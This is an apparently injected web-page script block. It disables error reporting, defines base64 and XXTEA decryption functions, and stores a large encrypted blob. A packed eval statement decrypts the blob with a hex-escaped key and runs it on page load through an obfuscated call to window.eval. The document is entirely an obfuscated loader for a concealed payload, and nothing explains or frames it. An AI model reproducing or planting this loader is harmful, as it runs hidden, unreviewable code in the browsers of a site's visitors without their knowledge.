<script>window.onerror=function(){return true;}</script>
<script>
/*Extreme*/
window.defaultStatus="Íê³É";
Status="utf8to16";
function utf8to16(str){var out,i,len,c;var char2,char3;out=[];len=str.length;i=0;while(i<len){c=str.charCodeAt(i++);switch(c>>4)
{case 0:case 1:case 2:case 3:case 4:case 5:case 6:case 7:out[out.length]=str.charAt(i-1);break;case 12:case 13:char2=str.charCodeAt(i++);out[out.length]=String.fromCharCode(((c&0x1F)<<6)|(char2&0x3F));break;case 14:char2=str.charCodeAt(i++);char3=str.charCodeAt(i++);out[out.length]=String.fromCharCode(((c&0x0F)<<12)|((char2&0x3F)<<6)|((char3&0x3F)<<0));break;}}
return out.join('');}
var base64DecodeChars=new Array(-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-1,-1,-1,-1,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,-1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1);
function base64decode(str)
{var c1,c2,c3,c4;var i,len,out;len=str.length;i=0;out = "";while(i<len)
{do
{c1=base64DecodeChars[str.charCodeAt(i++)&0xff]}while(i<len&&c1==-1);if(c1==-1)
break;do
{c2=base64DecodeChars[str.charCodeAt(i++)&0xff]}while(i<len&&c2==-1);if(c2==-1)
break;out+=String.fromCharCode((c1<<2)|((c2&0x30)>>4));do
{c3=str.charCodeAt(i++)&0xff;if(c3==61)
return out;c3=base64DecodeChars[c3]}while(i<len&&c3==-1);if(c3==-1)
break;out+=String.fromCharCode(((c2&0XF)<<4)|((c3&0x3C)>>2));do
{c4=str.charCodeAt(i++)&0xff;if(c4==61)
return out;c4=base64DecodeChars[c4]}while(i<len&&c4==-1);if(c4==-1)
break;out+=String.fromCharCode(((c3&0x03)<<6)|c4)}
return out}
function long2str(v,w){var vl=v.length;var sl=v[vl-1]&0xffffffff;for(var i=0;i<vl;i++)
{v[i]=String.fromCharCode(v[i]&0xff,v[i]>>>8&0xff,v[i]>>>16&0xff,v[i]>>>24&0xff);}
if(w){return v.join('').substring(0,sl);}
else{return v.join('');}}
function str2long(s,w){var len=s.length;var v=[];for(var i=0;i<len;i+=4)
{v[i>>2]=s.charCodeAt(i)|s.charCodeAt(i+1)<<8|s.charCodeAt(i+2)<<16|s.charCodeAt(i+3)<<24;}
if(w){v[v.length]=len;}
return v;}
function xxtea_decrypt(str,key){if(str==""){return"";}
var v=str2long(str,false);var k=str2long(key,false);var n=v.length-1;var z=v[n-1],y=v[0],delta=0x9E3779B9;var mx,e,q=Math.floor(6+52/(n+1)),sum=q*delta&0xffffffff;while(sum!=0){e=sum>>>2&3;for(var p=n;p>0;p--){z=v[p-1];mx=(z>>>5^y<<2)+(y>>>3^z<<4)^(sum^y)+(k[p&3^e]^z);y=v[p]=v[p]-mx&0xffffffff;}
z=v[n];mx=(z>>>5^y<<2)+(y>>>3^z<<4)^(sum^y)+(k[p&3^e]^z);y=v[0]=v[0]-mx&0xffffffff;sum=sum-delta&0xffffffff;}
return long2str(v,true);}
t="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";
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0=4(5(3(0),\'\\2\\1\\6\\d\\7\'));c["\\b\\a\\8\\9"](0);',14,14,'t|x75|x66|base64decode|utf8to16|xxtea_decrypt|x63|x31|x61|x6c|x76|x65|window|x6b'.split('|'),0,{}))
/*Extreme*/
</script>